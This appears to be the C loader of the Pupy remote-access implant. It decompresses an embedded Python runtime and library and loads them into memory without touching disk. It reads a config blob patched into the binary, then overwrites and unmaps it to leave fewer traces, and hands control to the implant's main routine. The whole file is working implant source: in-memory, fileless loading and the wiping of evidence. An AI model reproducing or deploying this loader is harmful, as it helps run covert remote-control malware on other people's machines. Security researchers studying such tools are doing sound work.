/* **************** Python-dynload.c **************** */
#include "Python-dynload.h"
#include "Python-dynload-os.h"


typedef struct dependency {
    const char* name;
    const char *bytes;
    size_t size;
    BOOL is_python;
} dependency_t;

struct py_imports py_sym_table[] = {
#include "import-tab.c"
    { NULL, NULL }, /* sentinel */
};

static char __config__[500000] = "####---PUPY_CONFIG_COMES_HERE---####\n";

static PyGILState_STATE restore_state;
static BOOL is_initialized = FALSE;
static const PyObject *py_stdlib_G = NULL;

/* Likely-to-be-used modules */
static const char *preload_modules[] = {
    "types",
    //"linecache",
    "codecs",

    "_weakrefset",
    "_py_abc",
    "abc",
    "__future__",
    "warnings",
    "importlib._bootstrap",
    "sre_constants",
    "sre_parse",
    "sre_compile",
    "struct",
    ENCODINGS ".aliases",

    NULL
};

#include "lzmaunpack.c"
#include "library.c"

static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init);

static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize, void *arg) {
    HMODULE hModule;
    void *uncompressed = NULL;
    Py_ssize_t uncompressed_size = 0;

    dprint("Uncompressing %s from %p (size=%d\n)\n", libname, xzbuf, xzsize);

    uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);

    if (!uncompressed) {
        dprint("%s decompression failed\n", libname);
        return NULL;
    }

    dprint("%s decompressed to %p (size=%d)\n", libname, uncompressed, uncompressed_size);

    hModule = MemLoadLibrary(
        libname, (char *) uncompressed, uncompressed_size, arg
    );

#if FREE_HMODULE_AFTER_LOAD
    lzmafree(uncompressed, uncompressed_size);
#endif

    if (!hModule) {
        dprint("loading %s from memory failed\n", libname);
        return NULL;
    }

    return hModule;
}

PyObject* load_stdlib() {
	if(py_stdlib_G == NULL) {
		PyObject *py_stdlib;
		dprint("Stdlib size: %d\n", library_c_size);
		py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
		if (!py_stdlib) {
			dprint("load_stdlib: PyDict_lzmaunpack() -> Error unpacking py_stdlib\n");
			return NULL;
		}
		Py_IncRef(py_stdlib);

		dprint("Stdlib unpacked: %p\n", py_stdlib);
		py_stdlib_G = py_stdlib;

		dprint("Unmap stdlib..\n");
		OSUnmapRegion(library_c_start, library_c_size);
		dprint("Unmap stdlib.. done\n");
		return py_stdlib;
	} else {
		dprint("stdlib already loaded\n");
		return py_stdlib_G;
	}
}

static
size_t last_chr_offt(const char *cstr, char chr) {
    int found_any = 0;
    size_t last_found = 0;
    size_t offt;

    for (offt=0; cstr && cstr[offt]; offt++) {
        if (cstr[offt] == chr) {
            found_any = 1;
            last_found = offt;
        }
    }

    if (found_any)
        return last_found;
    else
        return offt;
}


BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
    HMODULE hPython = NULL;
    PyObject *py_argv = NULL;
    PyObject *py_empty_list = NULL;
    dependency_t dependencies[] = DEPENDENCIES;
    resolve_symbol_t resolver = NULL;
    dependency_t *dependency = NULL;
    struct py_imports *py_sym = NULL;
    int i;

    if (is_initialized) {
        return TRUE;
    }
#ifdef DEBUG_USE_OS_PYTHON
    hPython = OSLoadLibrary("python310.dll");
    resolver = OSResolveSymbol;
#else
    for (dependency=dependencies; !hPython; dependency ++) {
        HMODULE hModule = CheckLibraryLoaded(dependency->name);

        if (hModule) {
            if (dependency->is_python) {
                hPython = hModule;
                resolver = OSResolveSymbol;
            }

            continue;
        }

        dprint("Loading %s\n", dependency->name);

        hModule = xz_dynload(
            dependency->name, dependency->bytes, dependency->size, NULL
        );

        dprint("Loaded %s -> %p\n", dependency->name, hModule);

        OSUnmapRegion(dependency->bytes, dependency->size);

        if (!hModule) {
            dprint("%s: load failed\n", dependency->name);
            return FALSE;
        }

        if (dependency->is_python) {
            hPython = hModule;
            resolver = MemResolveSymbol;
        }
    }
#endif

    dprint("Loading python from %p\n", hPython);

    for (py_sym = py_sym_table; py_sym->name; py_sym ++) {
        py_sym->proc = (void (*)()) resolver(hPython, py_sym->name);
        if (py_sym->proc == NULL) {
            dprint("undefined symbol %s\n", py_sym->name);
            return FALSE;
        }
    }



    dprint("Initializing Path & Flags ...\n");
    if(!Py_IsInitialized()) {
        dprint("Py not initialized yet\n");
       
        dprint("Setting python flags ...\n");
        char * pgm = OSGetProgramName();
        wchar_t wtext[PATH_MAX];
        mbstowcs(wtext, pgm, strlen(pgm)+1);//Plus null

        //wchar_t * path= "";
        Py_SetProgramName(wtext);
        //wchar_t libfilename[PATH_MAX];
        //GetModuleFileNameW(NULL, libfilename, sizeof(libfilename));
        //dprint("libfilename: %S\n",libfilename);
        wchar_t *wchar_paths = Py_DecodeLocale(".", NULL);
        Py_SetPath(wchar_paths);
        
        /* 
        wchar_t * ppath = Py_GetPath();
        if (ppath)
            memset(ppath, '\0', strlen(ppath));
        */
        
	    PyStatus status;

		PyPreConfig preconfig;

        dprint("init python preconfig\n");
        /*
		typedef void (CALLBACK* PyPreConfig_InitPythonConfigT)(PyPreConfig *);
		PyPreConfig_InitPythonConfigT PyPreConfig_InitPythonConfig;
        (PyPreConfig_InitPythonConfigT)PyPreConfig_InitPythonConfig = MyGetProcAddress(hPython, "PyPreConfig_InitPythonConfig");
        */
		PyPreConfig_InitPythonConfig(&preconfig);
		//preconfig.legacy_windows_fs_encoding = 0;
		//preconfig.isolated = 0;
        preconfig.use_environment = 0;
		//preconfig.utf8_mode = 1;
	
        dprint("call preinitialize\n");
		Py_PreInitialize(&preconfig);

		
		
		PyConfig config;
		//typedef void (CALLBACK* PyConfig_InitPythonConfigT)(PyConfig *);
        //(PyConfig_InitPythonConfigT)PyConfig_InitPythonConfig = MyGetProcAddress(hPython, "PyConfig_InitPythonConfig");
		
        dprint("init python config\n");
		PyConfig_InitPythonConfig(&config);
        
		config._init_main = 0;
		config.isolated = 0;
        config.site_import = 0;
        config.user_site_directory = 0;
        config.write_bytecode = 0;
        

        dprint("Py_InitializeFromConfig\n");

		status = Py_InitializeFromConfig(&config);



        /*
        Py_IsolatedFlag = 1;
        Py_OptimizeFlag = 2;
        Py_UnbufferedStdioFlag = 1;
        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
        Py_NoSiteFlag = 1;
        Py_DontWriteBytecodeFlag = 1;
        Py_NoUserSiteDirectory = 1;
        Py_IgnoreEnvironmentFlag = 1;
       
        
        */

        //int * Py_IsolatedFlagPTR = (int *)MyGetProcAddress(hPython, "Py_IsolatedFlag");
        //*Py_IsolatedFlagPTR = 1;

		//PyConfig_Clear(&config);

		
        //Py_Initialize();
        //Py_InitializeEx(is_shared_object? 0 : 1);
        dprint("done\n");


        
        

        dprint("calling PyEval_InitThreads\n");
        PyEval_InitThreads();
    }


    dprint("calling PyGILState_Ensure\n");
    restore_state = PyGILState_Ensure();

    py_empty_list = PyList_New(0);
    if (!py_empty_list) {
        dprint("Couldn't allocate list for sys.path\n");
        goto lbExit1;
    }

    PySys_SetObject("path", py_empty_list);
    

    dprint("SET ARGV (ARGC=%d; SHARED? %d)\n", argc, is_shared_object);

    if (is_shared_object) {
        if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
            argv[1] = argv[0];
            argc -= 1;
            argv += 1;
        } else {
            argc = 1;
        }
    }

    py_argv = PyList_New(0);
    if (!py_argv) {
        dprint("Couldn't allocate list for argv\n");
        goto lbExit1;
    }

    Py_IncRef(py_argv);

    for (i = 0; i<argc && argv[i]; i++) {
        PyList_Append(py_argv, PyUnicode_FromString(argv[i]));
    }

    PySys_SetObject("executable", PyUnicode_FromString(OSGetProgramName()));
    PySys_SetObject("argv", py_argv);

    Py_DecRef(py_argv);

    //setup_jvm_class();

    dprint("Python initialized\n");
    return TRUE;

lbExit1:
    return FALSE;
}


static
PyObject *py_eval_package_init(
    const char *name, PyObject *co_code,
        const char *vpath, const char *path, int is_init)
{
    PyObject *new_module;
    PyObject *new_module_dict;
    PyObject *builtins;
    PyObject *py_eval_result;
    PyObject *modules = NULL;

    size_t last_dm = 0;

    modules = PySys_GetObject("modules");
    if (!modules) {
        dprint(
            "py_eval_package_init(%s) :: can't get sys.modules\n",
            name
        );

        return NULL;
    }

    new_module = PyImport_AddModule(name);
    if (!new_module) {
        dprint(
            "py_eval_package_init(%s) - PyImport_AddModule failed\n", name
        );

        return NULL;
    }

    new_module_dict = PyModule_GetDict(new_module);

    PyObject_SetAttrString(
        new_module, "__file__", PyUnicode_FromString(vpath));

    dprint(
        "py_eval_package_init(%s) %p.__file__ = %s\n",
        name, new_module, vpath
    );

    last_dm = last_chr_offt(name, '.');

    if (is_init) {
        PyObject *key, *value;
        Py_ssize_t pos = 0;
        Py_ssize_t name_len = strlen(name);

        PyObject_SetAttrString(
            new_module, "__package__", PyUnicode_FromString(name)
        );

        dprint(
            "py_eval_package_init(%s) %p.__package__ = %s\n",
            name, new_module, name
        );


        dprint(
            "py_eval_package_init(%s): iterate modules at %p\n", name, modules
        );

        /* Need to find/set all childs */
        while (PyDict_Next(modules, &pos, &key, &value)) {
            const char *modname = NULL;
            Py_ssize_t modname_len = 0;
            if (PyUnicode_FromStringAndSize(key, &modname, &modname_len) < 0) {
                dprint(
                    "py_eval_package_init(%s) :: key at %d is not a string\n",
                    name, pos
                );

                PyErr_Clear();
            }
            modname = PyUnicode_AsUTF8AndSize(key, &modname_len);

            if (! (modname && modname_len)) {
                dprint(
                    "py_eval_package_init(%s) :: nothing to compare\n",
                    name
                );
                continue;
            }
            dprint("modname: %s modname_len: %d name_len: %d\n", modname, modname_len, name_len );
            
            if (strncmp("pupy.", modname, 5)) {
                continue;
             }
            if (modname_len < name_len + 2)
                continue;

            if (strncmp(name, modname, name_len))
                continue;

            if (modname[name_len] != '.')
                continue;

            dprint(
                "py_eval_package_init(%s) :: child: %s\n",
                name, modname + name_len + 1
            );

            PyObject_SetAttrString(
                new_module, modname + name_len + 1, value
            );
        }
    } else if (last_dm) {
        PyObject *py_tmp = PyUnicode_FromStringAndSize(
            name, last_dm
        );

        dprint(
            "py_eval_package_init(%s) %p.__package__ = %s\n",
            name, new_module, PyUnicode_AsUTF8(py_tmp)
        );

        PyObject_SetAttrString(
            new_module, "__package__", py_tmp
        );
    }

    last_dm = last_chr_offt(vpath + sizeof(VPATH_PREFIX), '/');

    if (last_dm) {
        PyObject *py_vpath;

        last_dm += sizeof(VPATH_PREFIX);

        py_vpath = PyBytes_FromStringAndSize(
            vpath, last_dm);

        PyObject_SetAttrString(
            new_module, "__path__", Py_BuildValue("[O]", py_vpath));

        Py_DecRef(py_vpath);

        dprint(
            "py_eval_package_init(%s) %p.__path__ = [%s] (refs=%d)\n",
            name, new_module, PyBytes_AsString(py_vpath), Py_RefCnt(py_vpath)
        );
    }

    //builtins = PyEval_GetBuiltins();
    builtins = PyImport_Import(PyUnicode_FromString("builtins"));
    if (!builtins) {
        dprint("py_eval_package_init(%s) : could not import builtins module\n", name);
    }
    Py_IncRef(builtins);
    PyDict_SetItemString(new_module_dict, "__builtins__", builtins);

    dprint(
        "py_eval_package_init(%s) %p.__dict__['__builtins__'] = %p (refcnt=%d)\n",
        name, new_module, builtins, Py_RefCnt(builtins)
    );

    py_eval_result = PyEval_EvalCode(
        co_code, new_module_dict, new_module_dict);

    if (!py_eval_result) {
        // FIXME: Delete from sys.modules (?)
        if (PyDict_DelItemString(modules, name) < 0) {
            dprint(
                "py_eval_package_init(%s) Failed to delete from sys.modules\n", name
            );
        }
        return NULL;
    }

    Py_DecRef(py_eval_result);

    dprint(
        "py_eval_package_init(%s) -> builtins %p (refcnt=%d)\n",
        name, builtins, Py_RefCnt(builtins)
    );

    dprint(
        "py_eval_package_init(%s) -> %p (refcnt=%d) __dict__ %p (refcnt=%d) co_code %p (refcnt=%d)\n",
        name,
        new_module, Py_RefCnt(new_module),
        new_module_dict, Py_RefCnt(new_module_dict),
        co_code, Py_RefCnt(co_code)
    );

    return new_module;
}

/*
BOOL load_c_extension_from_stdlib(PyObject *py_stdlib, const char *name) {
    PyObject *pybody = NULL;
    char *pybody_c_ptr = NULL;
    Py_ssize_t pybody_c_size = 0;
    char * vpath_name;
    char * func_name;
    size_t vpath_len;
    BOOL result = TRUE;
    
    vpath_len = strlen(name) + 5;
    vpath_name = (char *) OSAlloc(vpath_len);
    if (!vpath_name)
        goto lbMemFailure1;
    func_name = (char *) OSAlloc(vpath_len+10);
    if (!vpath_name)
        goto lbMemFailure1;

    memset(vpath_name, '\0', vpath_len);
    strcat(vpath_name, name);
#ifdef _WIN32
    strcat(vpath_name, ".pyd");
#else
    strcat(vpath_name, ".so");
#endif

    memset(func_name, '\0', vpath_len+10);
    strcat(func_name, "PyInit_");
    strcat(func_name, name);

    dprint("loading C extension from stdlib: %s\n", vpath_name);

    pybody = PyDict_GetItemString(py_stdlib, vpath_name);
    if (!pybody) {
        dprint(
            "load_c_extension_from_stdlib(%s) -> %s not found in stdlib\n",
            name, vpath_name
        );

        PyErr_SetString(PyExc_ImportError, name);
        result = FALSE;
        goto lbFreeVpath;
    }

    HMODULE hModule = CheckLibraryLoaded(vpath_name);
    if (hModule) {
        dprint("library %s already loaded\n", vpath_name);
        return FALSE;
    }


    if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
        dprint(
            "load_c_extension_from_stdlib(%s) -> %s -> Invalid type?\n",
            name, vpath_name
        );
        result = FALSE;
        goto lbFreeVpath;
    }

#ifdef _WIN32
    if(!(pybody_c_ptr[0]=='M' && pybody_c_ptr[1]=='Z')) {
        dprint("extension %s is not a PE ??\n", vpath_name);
        goto lbFreeVpath;
    }
#endif

    ULONG_PTR cookie = 0;

    cookie = _My_ActivateActCtx();
    hModule = MemLoadLibrary(
        vpath_name, pybody_c_ptr, pybody_c_size, NULL
    );
    _My_DeactivateActCtx(cookie);
    if (!hModule) {
        dprint("MemLoadLibrary( %s ) failed\n", vpath_name);
        result = FALSE;
        goto lbFreeVpath;
    }

    char * oldcontext = _Py_PackageContext;
    _Py_PackageContext = name;

    typedef FARPROC (*PyInitT)(void);
    PyInitT PyInitF;
    PyInitF = (PyInitT)MemResolveSymbol(hModule, func_name);
    PyInitF();

    _Py_PackageContext = oldcontext;
    if (PyErr_Occurred())
        result=FALSE;
    //PyImport_AppendInittab(name, func_name);

    lbFreeVpath:
        OSFree(vpath_name);
        OSFree(func_name);

    return result;

    lbMemFailure1:
        return PyErr_NoMemory();
}
*/



static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init) {
    PyObject *module = NULL;
    PyObject *pybody = NULL;
    PyObject *pybytecode = NULL;

    char *pybody_c_ptr = NULL;
    Py_ssize_t pybody_c_size = 0;

    char *vpath_name = NULL;
    char *path_name = NULL;
    char *ptr = NULL;

    int is_path = 1;

    // pupy:// name /__init__.pyo
    // OR
    // pupy:// name .pyo

    size_t vpath_len =
        strlen(name)
        + sizeof(VPATH_PREFIX) - 1
        + (is_init? sizeof(VPATH_INIT_EXT) : sizeof(VPATH_EXT)) - 1
        + 1
        ;

    vpath_name = (char *) OSAlloc(vpath_len);
    if (!vpath_name)
        goto lbMemFailure1;

    memset(vpath_name, '\0', vpath_len);
    strcpy(vpath_name, VPATH_PREFIX);
    strcat(vpath_name, name);

    for (ptr=vpath_name; *ptr; ptr++)
        if (*ptr == '.')
            *ptr = '/';

    if (is_init)
        strcat(vpath_name, VPATH_INIT_EXT);
    else
        strcat(vpath_name, VPATH_EXT);

    // same string without pupy://
    path_name = vpath_name + sizeof(VPATH_PREFIX) - 1;

    pybody = PyDict_GetItemString(py_stdlib, path_name);
    if (!pybody) {
        dprint(
            "py_module_from_library(%s, %d) -> %s (%s) not found in stdlib\n",
            name, is_init, path_name, vpath_name
        );

        PyErr_SetString(PyExc_ImportError, name);
        goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s found -> %p\n",
        name, is_init, path_name, pybody
    );

    if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
        dprint(
            "py_module_from_library(%s, %d) -> %s -> Invalid type?\n",
            name, is_init, path_name
        );

    goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d\n",
        name, is_init, path_name, pybody,
        pybody_c_ptr, pybody_c_size
    );

    pybytecode = PyMarshal_ReadObjectFromString(
        pybody_c_ptr + 8, pybody_c_size - 8
    );

    if (!pybytecode) {
        dprint(
            "py_module_from_library(%s, %d) -> %s -> Invalid type (marshall error)?\n",
            name, is_init, path_name
        );

        goto lbFreeVpath;
    }

    dprint(
        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d -> Unmarshalled -> %p\n",
        name, is_init, path_name, pybody,
        pybody_c_ptr, pybody_c_size,
        pybytecode
    );

    // It's worth to continue
    module = py_eval_package_init(name, pybytecode, vpath_name, path_name, is_init);
    if (!module) {
        dprint("py_module_from_library(%s, %d) -> Eval failed\n", name, is_init);
        PyErr_Print();
        goto lbFreePyBytecode;
    }

    dprint("py_module_from_library(%s, %d) -> %p\n", name, is_init, module);

    //TODO: fix that
    //PyDict_DelItemString(py_stdlib, path_name);

lbFreePyBytecode:
    Py_DecRef(pybytecode);

lbFreeVpath:
    OSFree(vpath_name);

    return module;

lbMemFailure1:
    return PyErr_NoMemory();
}


void py_clear_sys_list(const char *name)
{
    PyObject *list_obj;
    Py_ssize_t list_len;

    list_obj = PySys_GetObject(name);
    if (!list_obj) {
        dprint("sys.%s not found\n", name);
        PyErr_Clear();
        return;
    }

    list_len = PyList_Size(list_obj);
    if (list_len < 0) {
        dprint("sys.%s is not list\n", name);
        PyErr_Clear();
        return;
    }

    if (PyList_SetSlice(list_obj, 0, list_len, NULL) < 0) {
        dprint("sys.%s - failed to clear\n", name);
        PyErr_Clear();
        return;
    }

    dprint("sys.%s - cleared\n", name);
}


void py_clear_sys_dict(const char *name)
{
    PyObject *dict_obj;

    dict_obj = PySys_GetObject(name);
    if (!dict_obj) {
        dprint("sys.%s not found\n", name);
        PyErr_Clear();
        return;
    }

    PyDict_Clear(dict_obj);
    if (PyErr_Occurred()) {
        dprint("sys.%s - failed to clear\n", name);
        PyErr_Clear();
        return;
    }

    dprint("sys.%s - cleared\n", name);
}


void run_pupy() {
    union {
        unsigned int l;
        unsigned char c[4];
    } len;

    PyObject *pupy;

    PyObject *py_config_list;
    PyObject *py_pupylib;
    PyObject *pupy_dict;
    PyObject *py_debug;
    PyObject *py_main;
    PyObject *py_eval_result;
    PyObject *py_config = NULL;

	PyObject *py_stdlib = load_stdlib();
    const char **preload_module = NULL;
    PyObject *py_stdlib_keys;
    PyObject *py_stdlib_keys_iter;
    PyObject *py_stdlib_keys_item;
    PyStatus status;


    PySys_SetObject("frozen", PyBool_FromLong(1));

    
    
    dprint("Load config\n");
    dprint("config:");
    int i;
    for (i=0; i<5; i++) {
        dprint("%x", __config__[i]);
    }
    len.c[3] = __config__[0];
    len.c[2] = __config__[1];
    len.c[1] = __config__[2];
    len.c[0] = __config__[3];
    dprint("\n");

    if (len.l == 0x23232323) {
        dprint("Config not found\n");
        goto lbExit1;
    }

    dprint("Config size: %d\n", len.l);

    py_config_list = PyObject_lzmaunpack(__config__+4, len.l);
    if (!py_config_list) {
        dprint("Config unpack failed\n");
        PyErr_Print();
        goto lbExit1;
    }

    dprint("Config parcel unpacked: %p\n", py_config_list);
    dprint("Cleanup config\n");
    memset(__config__, 0xFF, len.l + 4);

    dprint("Unmap config");
    OSUnmapRegion(__config__, len.l);

    py_config = PyList_GetItem(py_config_list, 0);
    dprint("Get config: %p\n", py_config);

    py_pupylib = PyList_GetItem(py_config_list, 1);
    dprint("Get pupy: %p\n", py_pupylib);

    dprint("Update stdlib\n");
    PyDict_Update(py_stdlib, py_pupylib);

    Py_IncRef(py_config);

    
    for (preload_module=preload_modules; *preload_module; preload_module ++) {
        if (!py_module_from_stdlib(py_stdlib, *preload_module, 0))
            goto lbExit4;
    }

    // the order of loading matters here
    //
    if (!py_module_from_stdlib(py_stdlib, "keyword", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "operator", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "reprlib", 0))
        goto lbExit4;
    
    if (!py_module_from_stdlib(py_stdlib, "_collections_abc", 0))
        goto lbExit4;
    
    if (!py_module_from_stdlib(py_stdlib, "collections.abc", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "collections", 1))
        goto lbExit4;
    
    if (!py_module_from_stdlib(py_stdlib, "functools", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "contextlib", 0))
        goto lbExit4;


    if (!py_module_from_stdlib(py_stdlib, ENCODINGS, 1))
        goto lbExit4;

    if (!py_module_from_stdlib(py_stdlib, "datetime", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "io", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "umsgpack", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "copyreg", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "enum", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "re", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "_compat_pickle", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "pickle", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "quopri", 0))
           goto lbExit4;

    if (!py_module_from_stdlib(py_stdlib, "importlib", 1))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "importlib._abc", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "importlib.util", 0))
        goto lbExit4;
    //if (!py_module_from_stdlib(py_stdlib, "pupy.utils", 0))
    //    goto lbExit4;
    
    
    
    
    
    //if (!py_module_from_stdlib(py_stdlib, "stringprep", 0))
    //    goto lbExit4;
 //   if (!py_module_from_stdlib(py_stdlib, "io", 0))
 //       goto lbExit4;
  /*  if (!py_module_from_stdlib(py_stdlib, "re", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "base64", 0))
        goto lbExit4;
    if (!py_module_from_stdlib(py_stdlib, "bz2", 0))
        goto lbExit4;
  */
		
		dprint("Preload encodings\n");
		
		py_stdlib_keys = PyDict_Keys(py_stdlib);
		if (!py_stdlib_keys)
			goto lbExit1;

		py_stdlib_keys_iter = PyObject_GetIter(py_stdlib_keys);
		if (!py_stdlib_keys_iter) {
			Py_DecRef(py_stdlib_keys);
			goto lbExit1;
		}

		while ((py_stdlib_keys_item = PyIter_Next(py_stdlib_keys_iter))) {
			char *filepath;
			Py_ssize_t filepath_len;
			filepath = PyUnicode_AsUTF8AndSize(py_stdlib_keys_item, &filepath_len);
			if (!filepath) {
				PyErr_Clear();
			} else if (strstr(filepath, ENCODINGS "/") == filepath &&
				strstr(filepath, ENCODINGS "/" VPATH_INIT_EXT) != filepath) {
				char *child = strdup(filepath);
				child[last_chr_offt(child, '.')] = '\0';
				child[sizeof(ENCODINGS) - 1] = '.';

				if (!py_module_from_stdlib(py_stdlib, child, 0)) {
					dprint("Load encoding: %s (%s): failed\n", child, filepath);
					PyErr_Clear();
				} else {
					dprint("Loaded encoding: %s\n", child);
				}

				free(child);
			}

			Py_DecRef(py_stdlib_keys_item);
		}
		Py_DecRef(py_stdlib_keys_iter);



    dprint("Calling _Py_InitializeMain() ...\n");
    status = _Py_InitializeMain();
 /*   if (PyStatus_Exception(status)) {
        dprint("Error calling _Py_InitializeMain\n");
        Py_ExitStatusException(status);
    }
   */ 
    dprint("Clean sys defaults\n");

    py_clear_sys_list("path");
    //py_clear_sys_list("meta_path");
    //py_clear_sys_list("path_hooks");
    
    //mandatory !!
    py_clear_sys_dict("path_importer_cache");
    
    /*
    res = PyRun_SimpleString(
        "import _pupy;"
        "print(_pupy, "
               "file=sys.stderr)");
    if (res < 0) {
        exit(1);
    }
    */

    dprint("Loading pupy\n");
    pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
    if (!pupy)
        goto lbExit4;

    pupy_dict = PyModule_GetDict(pupy);
    py_main = PyDict_GetItemString(pupy_dict, "main");

    if (!py_main) {
        dprint("pupy.main not found\n");
        goto lbExit3;
    }

#ifdef DEBUG
    py_debug = PyBool_FromLong(1);
#else
    py_debug = PyBool_FromLong(0);
#endif

    dprint(
        "Call pupy.main: %p(%p, %p, %p)\n",
        py_main, Py_None, py_debug, py_config
    );

    Py_IncRef(py_main);
    Py_IncRef(Py_None);
    Py_IncRef(py_debug);

    py_eval_result = PyObject_CallFunctionObjArgs(
        py_main, Py_None, py_debug, py_config, py_stdlib, NULL);

    if (!py_eval_result) {
        PyErr_Print();
    } else {
        Py_DecRef(py_eval_result);
    }

    Py_DecRef(py_main);
    Py_DecRef(Py_None);
    Py_DecRef(py_debug);

    dprint("Completed (py_eval_result: %p)\n", py_eval_result);

lbExit4:
    Py_DecRef(py_config);

lbExit3:
    Py_DecRef(py_config_list);

lbExit2:
    //Py_DecRef(py_stdlib);

lbExit1:
    dprint("Exit\n");
}

void deinitialize_python() {
    dprint("Deinitialize python\n");
    PyGILState_Release(restore_state);
    Py_Finalize();
}

int Py_RefCnt(const PyObject *object) {
    if (!object)
        return -1;

    return *((int *) object);
}
